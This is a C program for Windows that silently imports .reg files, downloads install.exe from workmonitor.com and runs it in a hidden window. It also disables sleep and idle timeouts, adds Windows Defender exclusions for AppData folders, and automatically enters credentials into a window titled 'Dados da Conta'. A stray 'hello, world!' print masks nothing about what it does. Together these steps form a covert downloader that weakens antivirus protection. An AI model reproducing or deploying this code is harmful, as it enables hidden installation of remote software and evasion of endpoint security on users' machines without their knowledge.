#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <tchar.h>
#include <shlwapi.h>
#include <Lmcons.h>  // Include this header for UNLEN
#include "testedigita.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")

int ImportRegFiles() {
    char regFilePath[MAX_PATH];
    GetModuleFileName(NULL, regFilePath, MAX_PATH);
    PathRemoveFileSpecA(regFilePath);

    strcat(regFilePath, "\\*.reg");

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFileA(regFilePath, &findFileData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                char regFile[MAX_PATH];
                strcpy(regFile, regFilePath);
                regFile[strlen(regFile) - strlen("\\*.reg")] = '\0';
                strcat(regFile, "\\");
                strcat(regFile, findFileData.cFileName);

                char cmd[MAX_PATH];
                strcpy(cmd, "/s ");
                strcat(cmd, regFile);
                
                ShellExecute(NULL, "open", "regedit.exe", cmd, NULL, SW_HIDE); 
            }
        } while (FindNextFileA(hFind, &findFileData));
        FindClose(hFind);
        printf("hello, world!\n");
        return 1;  // Sucesso na importação
    } else {
        return 0;  // Falha na importação
    }
}

void DownloadAndRun() {
    const char *url = "https://www.workmonitor.com/install/install.exe";
    const char *filePath = "C:\\Windows\\Temp\\install.exe";
    const char *cmd = "C:\\Windows\\Userr\\";

    HINTERNET hInternet = InternetOpen("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hUrl = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hUrl) {
            FILE *file = fopen(filePath, "wb");
            if (file) {
                char buffer[4096];
                DWORD bytesRead;
                while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead) {
                    fwrite(buffer, 1, bytesRead, file);
                }
                fclose(file);
            }
            InternetCloseHandle(hUrl);
        }
        InternetCloseHandle(hInternet);
    }

    ShellExecute(NULL, "open", filePath, "/S", NULL, SW_HIDE);
}

void ConfigurePowerSettings() {
    system("powercfg /s SCHEME_BALANCED");
    system("powercfg /change disk-timeout-ac 0");
    system("powercfg /change disk-timeout-dc 0");
    system("powercfg -SETACVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 5ca83367-6e45-459f-a27b-476b1d01c936 0");
    system("powercfg -SETDCVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 5ca83367-6e45-459f-a27b-476b1d01c936 0");
    system("powercfg -SETACVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 96996bc0-ad50-47ec-923b-6f41874dd9eb 0");
    system("powercfg -SETDCVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 96996bc0-ad50-47ec-923b-6f41874dd9eb 0");
    system("powercfg -SETACVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 7648efa3-dd9c-4e3e-b566-50f929386280 3");
    system("powercfg -SETDCVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 7648efa3-dd9c-4e3e-b566-50f929386280 3");
    system("powercfg -SETACVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e SUB_VIDEO VIDEOIDLE 0");
    system("powercfg -SETDCVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e SUB_VIDEO VIDEOIDLE 0");
    system("powercfg -SETACVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e SUB_SLEEP STANDBYIDLE 0");
    system("powercfg -SETDCVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e SUB_SLEEP STANDBYIDLE 0");
    system("powershell -Command \"try { Add-MpPreference -ExclusionPath '%APPDATA%' } catch { echo 'Falha ao adicionar excecao no antivirus' }\"");
}

void AddAntivirusExclusion() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);

    char exclusionPath[MAX_PATH];
    sprintf(exclusionPath, "C:\\Users\\%s\\AppData\\Roaming\\spa", username);

    char cmd[MAX_PATH + 50];
    sprintf(cmd, "powershell -Command \"try { Add-MpPreference -ExclusionPath '%s' } catch { echo 'Falha ao adicionar excecao no antivirus' }\"", exclusionPath);

    system(cmd);
}

int main() {
    int regImportSuccess = ImportRegFiles();

    DownloadAndRun();

    ConfigurePowerSettings();

    AddAntivirusExclusion();

    if (!regImportSuccess) {
        HWND hwnd = FindWindowByTitle("Dados da Conta");
        while (hwnd == NULL || GetForegroundWindow() != hwnd) {
            Sleep(2000); 
            hwnd = FindWindowByTitle("Dados da Conta");
        }
        InserirCredenciais();
    }

    return 0;
}